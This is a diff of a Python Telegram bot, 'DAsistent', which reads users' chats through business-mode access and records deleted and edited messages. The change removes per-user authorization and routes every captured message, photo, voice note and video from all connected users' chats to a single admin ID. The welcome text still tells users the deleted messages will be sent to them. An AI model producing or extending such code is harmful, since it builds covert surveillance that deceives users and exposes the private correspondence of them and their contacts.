@@ -7,29 +7,26 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppI
 from telegram.ext import Application, MessageHandler, filters, CallbackQueryHandler, ContextTypes
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))  # Твой Telegram ID
 GITHUB_PAGES_URL = f"https://ggcrachvvv-arch.github.io/Nobot/index.html?v={int(time.time())}"
 
 logging.basicConfig(level=logging.INFO)
 
-# База данных
 conn = sqlite3.Connection('data.db', check_same_thread=False)
 c = conn.cursor()
-c.execute('''CREATE TABLE IF NOT EXISTS users (
-    user_id INTEGER PRIMARY KEY,
-    username TEXT,
-    first_name TEXT,
-    is_authorized INTEGER DEFAULT 0
-)''')
 c.execute('''CREATE TABLE IF NOT EXISTS messages (
     msg_id INTEGER, chat_id INTEGER, user_id INTEGER, username TEXT, first_name TEXT,
-    text TEXT, file_id TEXT, file_type TEXT, owner_id INTEGER, timestamp TEXT,
-    PRIMARY KEY (msg_id, chat_id, owner_id)
+    text TEXT, file_id TEXT, file_type TEXT, chat_title TEXT, timestamp TEXT,
+    PRIMARY KEY (msg_id, chat_id)
 )''')
 conn.commit()
 
-def save_message(msg, owner_id):
-    """Сохраняет сообщение в базу мгновенно"""
+def save_message(msg):
+    """Сохраняет все сообщения из всех чатов"""
+    if not msg or not msg.from_user:
+        return
     user = msg.from_user
+    chat_title = msg.chat.title or msg.chat.first_name or msg.chat.last_name or "Личный чат"
     file_type = "text"
     file_id = None
     if msg.photo:
@@ -49,27 +46,13 @@ def save_message(msg, owner_id):
     
     c.execute('INSERT OR REPLACE INTO messages VALUES (?,?,?,?,?,?,?,?,?,?,?)',
               (msg.message_id, msg.chat_id, user.id, user.username, user.first_name,
-               msg.text, file_id, file_type, owner_id, datetime.now().isoformat()))
+               msg.text, file_id, file_type, chat_title, datetime.now().isoformat()))
     conn.commit()
-    logging.info(f"💾 Сохранено сообщение {msg.message_id} от {user.first_name}")
-
-def is_authorized(user_id):
-    c.execute('SELECT is_authorized FROM users WHERE user_id=?', (user_id,))
-    row = c.fetchone()
-    return row and row[0] == 1
+    logging.info(f"💾 Сохранено от {user.first_name} в чате {chat_title}")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Приветствие и инструкция по подключению"""
     user = update.effective_user
-    
-    # Добавляем пользователя в базу
-    c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, is_authorized) VALUES (?,?,?,?)',
-              (user.id, user.username, user.first_name, 1))  # Сразу авторизован
-    conn.commit()
-    
-    # Кнопка для открытия мини-приложения
     keyboard = [[InlineKeyboardButton("🚀 Открыть DAsistent", web_app=WebAppInfo(url=GITHUB_PAGES_URL))]]
-    
     text = f"""✨ **Привет, {user.first_name}!**
 
 Я **DAsistent** — бот, который видит удалённые сообщения.
@@ -83,87 +66,74 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    `Настройки` → `Секретарский режим` → `Добавить @HeiterszBOT`
    → Разреши доступ **«Ко всем чатам»**
 
-3️⃣ Готово! Теперь бот будет:
-   • 📦 Сохранять **каждое** сообщение
-   • ❌ Присылать **удалённые** сообщения
-   • ✏️ Показывать **изменённые** (было/стало)
-   • 👁 Сохранять **View Once** фото/видео
-
-✅ **Бот активирован!** Нажми на кнопку ниже, чтобы открыть мини-приложение."""
+3️⃣ Всё! Теперь я буду сохранять все сообщения из твоих чатов и присылать тебе удалённые."""
     
     await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Сохраняем все сообщения из чатов, где есть бот"""
-    if update.message and update.message.from_user:
-        uid = update.message.from_user.id
-        if is_authorized(uid):
-            save_message(update.message, uid)
+    """Сохраняем все сообщения"""
+    if update.message:
+        save_message(update.message)
 
 async def handle_edited(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обработка изменённых сообщений"""
     msg = update.edited_message
     if not msg:
         return
-    
-    # Ищем старое сообщение
-    c.execute('SELECT text, owner_id, first_name FROM messages WHERE msg_id=? AND chat_id=?', (msg.message_id, msg.chat_id))
+    c.execute('SELECT text, first_name, chat_title FROM messages WHERE msg_id=? AND chat_id=?', (msg.message_id, msg.chat_id))
     row = c.fetchone()
-    if row and is_authorized(row[1]):
+    if row:
         old_text = row[0] or "—"
-        name = row[2] or "Пользователь"
-        
-        # Сохраняем новую версию
-        save_message(msg, row[1])
-        
-        # Отправляем уведомление
-        await context.bot.send_message(
-            chat_id=row[1],
-            text=f"✏️ **{name}** изменил(а) сообщение:\n\n📌 Было: `{old_text[:300]}`\n\n🆕 Стало: `{msg.text[:300]}`",
-            parse_mode="Markdown"
-        )
+        name = row[1] or "Пользователь"
+        chat_title = row[2] or "Чат"
+        save_message(msg)
+        if ADMIN_ID:
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"✏️ **{name}** изменил(а) сообщение в чате **{chat_title}**:\n\n📌 Было: `{old_text[:300]}`\n\n🆕 Стало: `{msg.text[:300]}`",
+                parse_mode="Markdown"
+            )
 
 async def handle_deleted(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка удалённых сообщений — отправляем из базы"""
+    """Обработка удалённых сообщений — отправляем тебе"""
     if not hasattr(update, 'deleted_business_messages') or not update.deleted_business_messages:
         return
     
     for d in update.deleted_business_messages.messages:
-        c.execute('SELECT owner_id, first_name, username, text, file_type, file_id FROM messages WHERE msg_id=? AND chat_id=?',
+        c.execute('SELECT first_name, username, text, file_type, file_id, chat_title FROM messages WHERE msg_id=? AND chat_id=?',
                   (d.message_id, d.chat_id))
         row = c.fetchone()
-        if row and is_authorized(row[0]):
-            owner_id, first_name, username, text, file_type, file_id = row
-            name = f"{first_name} (@{username})" if username else first_name
-            
+        
+        if not row:
+            if ADMIN_ID:
+                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ Удалено сообщение (не сохранено)\nChat ID: {d.chat_id}")
+            continue
+        
+        first_name, username, text, file_type, file_id, chat_title = row
+        name = f"{first_name} (@{username})" if username else first_name
+        
+        if ADMIN_ID:
             if file_type == "text":
-                await context.bot.send_message(chat_id=owner_id, text=f"❌ {name} удалил(а):\n\n{text[:500]}")
+                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ **{name}** удалил(а) в чате **{chat_title}**:\n\n{text[:500]}", parse_mode="Markdown")
             elif file_type == "voice":
-                await context.bot.send_voice(chat_id=owner_id, voice=file_id, caption=f"🎤 {name} удалил(а) голосовое")
+                await context.bot.send_voice(chat_id=ADMIN_ID, voice=file_id, caption=f"🎤 {name} удалил(а) голосовое в чате {chat_title}")
             elif file_type == "photo":
-                await context.bot.send_photo(chat_id=owner_id, photo=file_id, caption=f"📷 {name} удалил(а) фото")
+                await context.bot.send_photo(chat_id=ADMIN_ID, photo=file_id, caption=f"📷 {name} удалил(а) фото в чате {chat_title}")
             elif file_type == "video":
-                await context.bot.send_video(chat_id=owner_id, video=file_id, caption=f"🎥 {name} удалил(а) видео")
+                await context.bot.send_video(chat_id=ADMIN_ID, video=file_id, caption=f"🎥 {name} удалил(а) видео в чате {chat_title}")
             else:
-                await context.bot.send_message(chat_id=owner_id, text=f"❌ {name} удалил(а): {file_type}\n{text or ''}")
+                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ {name} удалил(а) {file_type} в чате {chat_title}")
             
-            logging.info(f"📤 Отправлено удаление {d.message_id} для {owner_id}")
-
-async def webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка данных из мини-приложения"""
-    data = update.message.web_app_data.data
-    if data == "/start":
-        await start(update, context)
+            logging.info(f"📤 Удаление отправлено админу: {d.message_id}")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(MessageHandler(filters.COMMAND & filters.Regex(r'/start'), start))
-    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, webapp_data))
     app.add_handler(MessageHandler(filters.ALL, handle_message))
     app.add_handler(MessageHandler(filters.UpdateType.EDITED_MESSAGE, handle_edited))
     app.add_handler(MessageHandler(filters.ALL, handle_deleted), group=1)
     
-    logging.info("✅ DAsistent запущен")
+    logging.info("✅ DAsistent запущен. Мониторинг личных чатов активен.")
     app.run_polling()
 
 if __name__ == "__main__":
